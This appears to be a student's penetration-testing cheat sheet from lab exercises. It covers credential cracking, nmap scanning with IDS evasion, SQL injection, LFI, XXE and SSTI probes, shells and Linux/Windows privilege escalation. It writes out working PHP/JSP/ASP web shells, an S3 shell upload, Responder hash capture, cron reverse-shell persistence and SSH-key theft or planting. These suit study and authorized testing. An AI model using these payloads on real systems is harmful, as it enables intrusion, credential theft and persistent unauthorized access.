# Authentication

## General process

1. **Initial guesses**: 
   - Empty authentication (Anonymous login)
   - Default authentication: 
     - Google: *service + default credentials*
     - Web:
       - admin
       - user
     - Linux:
       - root (linux), 
     - Windows:
       - Guest
       - Administrator
   - Password: (*password*, same as username)
   - Password reuse on other services
2. **Password Spraying:**

   - Generate passwords with `pswgen`
3. **Brute Forcing**

   - zip files: johnthe ripper, use zip2john to convert it
     - `zip2john backup.zip > backup.hash`
     - `john backup.hash`

**Cracking:** `hashid` ->  [crackstation](https://crackstation.net/)

## Web

## Hash

Note that sometimes the credentials could be encrypted, in this case use `hashid` from the terminal to find out which kind of encryption is, and then use [crackstation](https://crackstation.net/) to try to crack it. 

### Shadow Hash

A shadow hash is the encrypted password of a local host. To crack it, we need the file /etc/passwd, which contains only the users with a local account.

# Enumeration

## Network

Locate and list servers, services connected to the ntework.

### nmap: Host Discovery

Given one or more IP addresses, we want to see which ones are alive. To do this, we can use ICMP echo requests, and see which ones provide an ICMP reply to this. 

**nmap options:**

```bash
$ sudo nmap [IP] -sn | grep for | cut -d" " -f5
```

This scanning method works only if the firewalls of the hosts allow it.

- IP format:

  - range  `nmap [IP_start/IP_end]`

  - host list: `nmap -iL FILE`
  - multiple ips [IP1] [IP2] ...

- **`-sn`**: perform a "ping scan"  without performing a full port scan. 

- **`-d" "`**: Specifies a space as the delimiter.

- **`-f5`**: Tells `cut` to output the fifth field (word) from each line.

- `-PE`:  Perform only *ICMP* ping scan. 

- `--reason` Displays why an host is alive

- `--packet-trace` Shows all packages sent and received

### nmap: Service scanning

The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defined otherwise and is also one of the most popular  scan methods. This scan method makes it possible to scan several  thousand ports per second. The TCP-SYN scan sends one packet with the  SYN flag and, therefore, never completes the three-way handshake, which  results in not establishing a full TCP connection to the scanned port.

- If our target sends a `SYN-ACK` flagged packet back to us, Nmap detects that the port is `open`.
- If the target responds with an `RST` flagged packet, it is an indicator that the port is `closed`.
- If Nmap does not receive a packet back, it will display it as `filtered`. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.

#### **nmap options:**

- `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. Also runs some default scripts
- `-sV` show the versions (banner grabbing)
- `-p-` all ports
- `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.
- `-Pn` disable the ICMP echo requests 
- `-n` disable DNS resolution
- `-A` aggressive scan
- `--packet-trace` Shows all packages sent and received
- `--version-trace` Show all version packages
- `--version-all` (Try every single probe to determine the version)          
- **protocols:**
  - `-sU` performs UDP scan
  - `-sS` SYN Scan: default
  - `-sT` Connect scan: sends a  `SYN` packet -> the port is open if it answers with  `SYN-ACK` packet and closed with an `RST` packet. 
    - Less stealthy and slow than `-sS`, but highly accurate.
    - Useful when the target has a firewall that drops incoming packets but allows outgoing packets. 

  - `-sA` ACK scan: much harder to filter for firewalls and IDS/IPS systems because they only send a TCP packet with only the ACK flag. 

  - `-O`: Performs operation system detection scan.
- **Firewall / IDS usuful flags:**
  
  - change protocol
  - `-D RND:5` Generates five random IP addresses that indicates the source IP the connection comes from.
  - `-S` Scans the target by using different source IP address.
  - `-e [INTERFACE]` Sends all requests through the specified interface.
  - `--dns-server <ns>,<ns>`) to specify DNS servers. 
  - `--source-port 53` specify a source port  for our scans. 
  - `-T` specifies the timeing (`0` paranoid - `5` insane)
  
- `nmap --script <script name> -p <port> <host>` to run other scripts.

  `--script "dns-* and discovery and not intrusive"`: this uses all the dns related scripts in the category discovery and not in the category intrusive. Here all the categories:

  - `auth` Determination of authentication credentials.
  - `broadcast` Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
  - `brute` Executes scripts that try to log in to the respective service by brute-forcing with credentials.
  - `default` Default scripts executed by using the -sC option.
  - `discovery` Evaluation of accessible services.
  - `dos` These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
  - `exploit` This category of scripts tries to exploit known vulnerabilities for the scanned port.
  - `external` Scripts that use external services for further processing.
  - `fuzzer` This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
  - `intrusive` Intrusive scripts that could negatively affect the target system.
  - `malware` Checks if some malware infects the target system.
  - `safe` Defensive scripts that do not perform intrusive and destructive access.
  - `version` Extension for service detection.
  - `vuln` Identification of specific vulnerabilities.



#### **nmap output**

- **`open`:** Connection to the scanned port has been established. These connections can be **TCP connections**, **UDP datagrams** as well as **SCTP associations**.
  
  - If the UDP port is `open`, we only get a response if the application is configured to do so.
  
- **`closed`:** 
  - The TCP protocol indicates that the packet we received back contains an `RST` flag. 
  - In the UDP scan, if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed.
  
- **`filtered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because:
  - the package was *dropped*: Nmap receives no response, and by default will resend the request, by setting the retry rate (`--max-retries`) to 10. 
  - A *firewall* reject the package: As a response, we could get one of the following error messages:
    - Net Unreachable
    - Net Prohibited
    - Host Unreachable
    - Host Prohibited
    - Port Unreachable
    - Proto Unreachable
  
- **`unfiltered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because either *no response is returned* from the target for the  port or we get *an error code* from the target.

- **`open|filtered`:** If we do not get a response for a specific port, `Nmap` will set it to that state. This indicates that a firewall or packet filter may protect the port.
  - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered.

- **`closed|filtered`:** This state only occurs in the **IP ID idle** scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.

- **`tcpwrapped`** it means that the behavior of the port is consistent with one that is  protected by tcpwrapper. Specifically, it means that a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data. 

  tcpwrapper protects *programs*, not ports. This means that a valid (not false-positive) `tcpwrapped` response indicates a real network service is available, but you are not on the list of hosts allowed to talk with it. When such a large number  of ports are shown as `tcpwrapped`, it is unlikely that they represent real services, so the behavior probably means something else.

**Firewalls and IDS/IPS**

Like the firewall, the intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are also software-based components. `IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. `IPS` complements `IDS` by taking specific defensive measures if a potential attack should have been detected, such as blocking the attacker's IP. Thus, from an attacker perspective, firewalls and IDS can be treated in the same way.

Here some way to deal with them:

- Change scanning protocol

- Change rate limit and intensity. If this isn't improving the results, then it means that it is a firewall and not a IPS, with `-T` and `--version-all`.

- Decoys:
  With the option `-D`,  Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent, e.g. `-D RND:5` it sends 5 random ones.

- IP ID manipulation: 

  There could be situations where only certain **subnets** are restricted from accessing specific services on a server. 

  In these cases, you might want to **manually specify a different source IP address** (using the `-S` and  `-e [interface (e.g. tun0)]` options ) from the ones in `ifconfig` to see if a different IP address (perhaps from a different subnet) gets better results.

- DNS Proxying

  - `--dns-server <ns>` to specify DNS servers, e.g. `1.1.1.1`. This method could be fundamental if we are in a demilitarized zone (`DMZ`). The company's DNS servers are usually more trusted than those from the  Internet. 

  - `--source-port 53` specifies the source port. If the administrator uses the firewall to control this  port and does not filter IDS/IPS properly, our TCP packets will be  trusted and passed through.

- If the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much  weaker than others. We can test this by trying to connect to this port  by using `Netcat`.

​	

### Fingerprinting

Get as much information about server and network

- **Banner grabbing** is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner  once a connection is initiated.

  - `-sV` and `--version-all` it is usually enough

  - `nmap -sV --script=banner <target>` 

  - manually: connect to the SMTP server using `nc`, grab the banner, and intercept the network traffic using `tcpdump`

    ```bash
    sudo tcpdump -i [eth0/tun0] host [YOUR_IP] and [IP_TO_LISTEN]
    ```

    ```bash
    sudo ncat -v [IP] [PORT] {--source-port }
    ```

    add `--udp` if the port you want to connect to with netcat is upd.
    Note that if netcat times out, then you should just try more times.

- **SNMP (Simple Network Management Protocol) :** string that provide information and statistics about a router or device

  - v1, v2:  everything is send in the clear
  - v3: security measure, encryption and authentication
  - [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.


### Services

**Services:**

- Authentication protocols (ssh, telnet, rdp, smb, vnc) → Find the credentials
- Read/Write (redis, ftp, tftp, smb, nfs, rsync, snmp, rpc, netbios, ldap)
- Database (redis, mysql, mssql, psql, mongodb, oracle-tns, whois)
- Network Access (squid, isakmp, irc, dns)
- E-mail (smtp, pop3, imap)

**Stacks (common ports)**

- 135, 139, 445 -> SMB
- 80, 8080, 8000, 8443, 3000 -> HTTP
- 88, 389, 5985 -> Active Directory
- 21, 2121 -> FTP
- 22, 2222 -> SSH
- 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo

**nxc**

Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/

`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`

To do *password spraying*, you can put a file instead of the username, with the most common ones.

Possible protocols:

	- ftp
	- smb
	- ssh
	- vnc
	- rdp
	- winrm
	- msSQL



## Web

### Directories and files

Gbuster or Ffuf to discover hidden files or directories

```bash
gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
```

-  **HTTP status code** 
   -  `200`  request was successful
   -  `403`  forbidden to access the resource.
   -  `301`  being redirected (not a failure case)



### DNS Subdomains

- Add DNS Server to the `/etc/resolv.conf` file.

- ```bash
  gobuster dns -d {URL} -w /usr/share/secLists/Discovery/DNS/{WORDLIST}
  ```



### Other Informations

- **Banner Grabbing**:

  - ```bash
    curl -IL {URL}
    ```

- **Eyewitness:** can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

  - ```bash
    echo "{URLS}" > urls.txt 
    ```

  - ```bash
    eyewitness -f urls.txt -d screens
    ```

- **Whatweb:** We can extract the version of web servers, supporting frameworks, and applications

  - ```bash
    whatweb {IP}
    ```

- **SSL/TLS Certificates:**bviewing the certificate could reveal details, such as the email  address and company name. These could potentially be used to conduct a  *phishing attack*.

- **robots.txt** It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers such as  Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 

- **source code** `CRTL + U`



# Exploitation

## General

Public Exploits:** 

- `searchsploit` 

  - `-x` opens  the code

- google

- https://sploitus.com/, [Exploit DB](https://www.exploit-db.com), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com)

- Metasploit:

  - `msfconsole`

    Any option with `Required` set to `yes` needs to be set for the exploit to work.

    ```bash
    > search exploit {exploit_found_with_searchsploit}
    > use {exploit}
    > show options {exploit}
    > set {option name} {option value}
    > check
    > exploit
    ```

**Conventions:**:

- 2.7.1 *Only this version* 
- 2.7.x *All the versions starting with 2.7*
- 2.7.x x<2 *Versions smaller or equal than this one on the x digit*
- 2.7.1 < *Versions smaller or equal than this one  maybe only on the last digit*

##  Network

### RDP 3389

`xfreerdp` 

### WINRM 5985

You can authenticate either with the password or with NTLM, which is a collection of authentication protocols transmitted in shared folders (like active directories). It is a single-sign-on (SSO), since you put the password only once, at login.

The password is stored as an hash,  one-way function that takes any amount of data and returns a fixed size value.

Use responder to attack it: 

```
sudo responder -I tun0 -w -d 
```

it creates a fake shared folder in your network, that if it interacts with the attacked ip (e.g. through the parameter of a web page), will steal the password as an Hash.

The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if we want to do RFI.

HASH Cracking

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

### MySQL

**Type:** Database

 `mysql -h {IP} -u root`

### REDIS

**Type:** Database

 `redis-cli -h [ip]`

Once inside redis environment `info` return information about the  server

- `Server` info: get version of redis
- `Keyspace` list of dictionaries (dictionaries) with statistics: number of keys, number of keys with expiration
- `select {index number of the database}`
- `keys *` List all the keys in the database
- `get {key}`

### msSQL 1433

-  `mssqlclient.py [[domain/]username[:password]@]<targetName or address> -windows-auth`

### FTP 21

**Type:** authentication

 `ftp`

### SMB 445

**Type:** read/write

- `smbclient\\\\{ip}\\{share}`
- `smbclient -N -L \\\\[IP ADDRESS]`
- `cd`, `ls`, and to download a file `mget`.
- `psexec` to open a shell

### RSyinc

- To read: `rsync -av --list-only rsync://{HOST}/`

- To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`


### TFTP UPD 69

**Type: ** Read/write

It allows file transfers without needing authentication.

```
tftp
>
```



## Web

### Introduction

### **HTTP Request**

```
[METHOD] /[PATH]?p1=[val1]&p2=[val2] HTTP/[VERSION]`
`Host:  [example.com]`
`[Head1: Val1]`
`...
[PAYLOAD]
```

### **Parameters**

Parameters are very important to spot, and they are grouped in different categories:

- **REFLECTED**: 

  Parameters that are reflected, i.e. they appear in the request and in the response. 

  - Template Injection (server or client side)

  - XXS/HTML Injection 

- **FUNCTIONAL**: 

  They have a functional scope (they could be reflected or not).

  - LFI / RFI (file fetching is their function), 

  - SQL injection (query to a database e.g. a search-bar or a login),

  - SSRF (URL fetching), 

  - OS injection (command execution, execute commands on the server).


- **FORMATTED:** 

  Parameters that appear in JSON or XML format

  - SSPP

  - XXE


`paramfuzz(query_url)` to fuzz get parameters

### Amazon Buckets (to place)

The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..

Use `awscli` to interact with them. 

To list the buckets:
`aws --endpoint=http://s3.thetoppers.htb s3 ls`

To list the objects inside the buckets just specify the bucket at the end of the previous command:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```



### Proxy

#### Host Misrouting

How to, given a domain, reach other subdomains with the same IP address. Thus, we want to brute force the “etc/hosts” file of the proxy.

After adding the domain to my `/etc/hosts` file:

```bash
gobuster vhost -u http://[DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Ignore any 400 Status output, since it means that the proxy refused your request.



### Server-side Injections

#### SQL Injections

Each time the user wants to log in, the web application sends the log-in page input to the SQL Service, comparing it with stored database entries for that specific user. 

 Post-log-in, the web application will set the user a special permission in the form of a cookie or authentication token that associates his online presence with his authenticated presence on the website. This cookie is stored both locally, on the user's browser storage, and the webserver.

**Vulnerability:** 

- Add  `'#` in the parameter

- Use sqlmap to confirm th

  ```bash
  sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs --level=5 --risk=3 --flush-session {--cookie=['COOKIE'] --dbms=[DATABASE]}```  
  ```

  - A common database to try MySQL or PosrGreSQL for php applications

  - To run code execution

    ```bash
    sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs {--cookie=['COOKIE'] --dbms=[DATABASE]}--os-shell
    ```



#### Local / Remote File Injection (LFI/RFI)

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. 

A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

We test the page parameter to see if we can include files on the target system in the server response. We
will test with some commonly known files that will have the same name across networks, Windows
domains, and systems which can be found [`here`](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt).

One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,
`WINDOWS\System32\drivers\etc\hosts` (this file aids in the local translation of host names to IP
addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\

```
page=../../../../../../../../windows/system32/drivers/etc/hosts
```

For instance, the file inclusion can be made possible because in the backend the `include()` method of PHP is
being used.

In Linux, there is the `/etc/passwd` file.

For a **RFI** you load the file remotely, e.g. though a server.

#### XML Eternal Entities (XXE or XEE)

*XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data.  Although the design of XML focuses on documents, the language is widely used for the representation of arbitrary data structures, such as those used in web services.

*XML Entities* are a way of representing an item of data within an XML
document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters < and > .

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Note that a parser transforms raw data into a structured format.

Using Burpsuit responder, one can try to read a file to check if the XXE vulnerability is indeed possible:

```php
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "FILE"> ]>
<data>&example;</data>
```

- FILE:
  - Linux: `"/etc/passwd"`
  - Windows file: `'file"///c:/windows/win.ini'`
- data: vulnerable parameter, the *reflected* one.



#### Template Injection SSTI

**Template Engines** are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client.

**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.

#### Identification of the template engine

![image-20240922190834802](/home/damuna/.config/Typora/typora-user-images/image-20240922190834802.png)

special characters commonly used in
template expressions:
`{{7*7}}`
`${7*7}`
`<%= 7*7 %>`
`${{7*7}}`
`#{7*7}`

Some of these payloads can also be seen in the previous image and are used to identify SSTI vulnerabilities.
If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code
and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.
Even if the code is not directly executed, an error message can indicate what is the engine used. <then, go to Hacktrix.



#  Shells

![image-20241009151501371](/home/damuna/.config/Typora/typora-user-images/image-20241009151501371.png)

## Reverse Shell

[ReverseShellGenerator](https://www.revshells.com/)

## Bind Shell

Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.

We can use `netcat` to connect to that port and get a connection to the shell. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another  connection immediately. However, if the bind shell command is stopped  for any reason, or if the remote host is rebooted, we would still lose  our access to the remote host and will have to exploit it again to gain  access.

## TTY Upgrade

Once we connect to a shell through Netcat, we will notice that we can  only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the  command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

It could happen that the history of the shell is empty if the upgrade is not performed, and the history could contain important information, such as passwords.

### python/stty method

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
Ctrl-Z	# Go to my Kali

# In Kali
$ stty raw -echo
$ fg	# Go to shell

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows [] columns []
```

## Web Shell

### Writing a Web Shell

A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

**Code: php**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**Code: jsp**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Code: asp**

```asp
<% eval request("cmd") %>
```



### Uploading a Web Shell

Now we have to write one of the web shells above in the web root

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\    |
| `XAMPP`    | C:\xampp\htdocs\       |

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. 



### Accessing the Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. 

- We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

- ```bash
  curl http://SERVER_IP:PORT/shell.php?cmd=id
  ```



Benefits:

- It would bypass any firewall  restriction in place, as it will not open a new connection on a port 
- If the compromised host is rebooted, the web shell would still be in place,  and we can access it and get command execution without exploiting the  remote host again.

Contra:

- Not as interactive



# Privilege Escalation

One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. 

## Scripts

- Linux
  - [Linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (enum)
  -  [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
  -  [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
  - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- Windows
  -  [Seatbelt](https://github.com/GhostPack/Seatbelt) (enum)
  -  [JAWS](https://github.com/411Hall/JAWS) (enum)
  - [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

## Linux

### Kernel Exploits

Unpatched/older versions of Linux/Windows

### Vulnerable Software

Installed software: we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system.

### User Privileges

- `sudo -l`: check sudo privileges
  - `sudo su` to switch to the root user `su [USER]` to switch to a local user
  - The `NOPASSWD` entry shows if a certain application can be executed without password
  - `sudo -u [USER] [COMMAND]` to execute an application as user and not as root
- Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. 
  - [GTFOBins](https://gtfobins.github.io) contains a list of commands and how they can be exploited through `sudo`. We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access.
  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user.

### Scheduled Tasks

Scripts that run at specific intervals to carry out a task. To take advantage:

- **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
  - `/etc/crontab`
  - `/etc/cron.d`
  - `/var/spool/cron/crontabs/root`

### Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. Check:

- `configuration` files
- `log` files, 
-  `bash_history` 

Check for **Password Reuse**!! 

### SSH Keys

#### Read Access

If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server.

```bash
$ nano id_rsa	# open and copy on your machine
$ chmod 600 id_rsa	# More restrictive permission
$ ssh root@10.10.10.10 -i id_rsa
```

In windows they are in 

#### Write Access

We can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`.

```bash
ssh-keygen -f key	#Generate a key in the output file key
ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
ssh root@10.10.10.10 -i key	# Login
```



## Windows

### Kernel Exploits

Unpatched/older versions of Windows

### Vulnerable Software

Installed software: `C:\Program Files`  to see what software is installed on the system.

### User Privileges

- `whoami`
  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user.
- check Desktop: `cd C:\Users\[USER]\Desktop`

### Scheduled Tasks

Scripts that run at specific intervals to carry out a task. To take advantage:

- **Add new scheduled task**
  - Linux: *Cron Jobs.* If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed.
    - `/etc/crontab`
    - `/etc/cron.d`
    - `/var/spool/cron/crontabs/root`

### Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows).

Look at enum scripts at the beginning.

Check for `Password Reuse`!! 

### SSH Keys

#### Read Access

If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in  `file:///c:/users/[USERNAME]/.ssh/id_rsa`, and use it to log in to the server.

```bash
$ nano id_rsa	# open and copy on your machine
$ chmod 600 id_rsa	# More restrictive permission
$ ssh root@10.10.10.10 -i id_rsa
```

#### Write Access

We can place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`.

```bash
ssh-keygen -f key	#Generate a key in the output file key
ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
ssh root@10.10.10.10 -i key	# Login
```



# Linux General

## Transferring Files

### wget/cURL to upload

- On my machine, go on the directory containing the file in interest

- Run python Server in it

  ```bash
  python3 -m http.server 8000	
  ```

- Download remotely

  ```bash
  curl [URL] -o [FILE_NAME]
  ```

### SCP

If we have ssh credentials:

```bash
scp [FILE_NAME] user@remotehost:[FILE_PATH]
```

### Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from  downloading a file from our machine. 

We can encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.

- Encode the file

```
base64 [FILE_NAME] -w 0
```

- Copy the string

- Go on the remote host, decode

  ```bash
  echo [STRING] | base64 -d > [FILE_NAME]
  ```

### Validate Transfer

`file`: validates the format of a file

`md5sum` validates the hash of the filestomi
